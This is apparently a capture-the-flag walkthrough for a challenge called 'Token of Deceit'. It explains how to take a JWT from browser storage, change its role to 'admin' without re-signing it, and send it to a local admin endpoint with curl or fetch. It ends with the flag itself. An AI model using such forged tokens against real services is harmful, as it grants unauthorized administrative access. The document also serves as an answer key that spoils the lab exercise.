## HOW TO SOLVE: TOKEN OF DECEIT

1. Sign up
   
     •	Create an account to be automatically assigned the "user" role.

2. Login

     •	After account creation, you’ll be redirected to the login page.
   
     •	Use the same credentials to log in.
   
     •	Upon successful login, the server generates and sends a JWT.

3. Decode the JWT without verifying the signature
   
     a. Open the console:
   
       •	On MacOS, press (Option + Command + J).
   
       •	On Windows, press (Ctrl + Shift + J).
       
     b. You’ll see the following message: **GET http://localhost:3000/admin 403 (Forbidden)**
   
     c. Run the following command in the console to get the token, containing three parts, each separated by a period (.):
   
        localStorage.getItem('token');
      
     d. The token role will be "user" as per your credentials.
   
     e. Visit jwt.io and paste the JWT into the "Encoded" field to view the decoded payload.

4. Manipulate the JWT Payload
     a. Change the role to "admin".
   
       For example:
   
       {
         "username": "isabella",
         "role": "admin",
         "iat": 1738901843,
         "exp": 1738905443
       }
   
     b. No need to re-sign the token, as the program has a vulnerability that does not verify the signature.
   
     c. Your JWT is now modified.

6. Send the Manipulated JWT to the Server (2 ways)
   
   You can use one of the following methods to send the modified JWT to the server:
   
   a. Using cURL (command line):
   
     •	Open your terminal and type:
     
       curl -H "Authorization: Bearer MANIPULATED-JWT" http://localhost:3000/admin
   
   b. Using the Browser Console:
   
     •	Run this JavaScript:
     
       fetch("http://localhost:3000/admin", {
           method: "GET",
           headers: {
               "Authorization": "Bearer MANIPULATED-JWT"
           }
       })
       .then(response => response.json())
       .then(data => console.log(data))
       .catch(error => console.error("Error:", error));

7. Access the Admin Endpoint and Retrieve the Flag
    
     a. The server will decode the manipulated token and grant admin access.
    
     b. The server will respond with the flag:
   
         {"flag":"ATHACKCTF{trust_is_a_vulnerability}"}
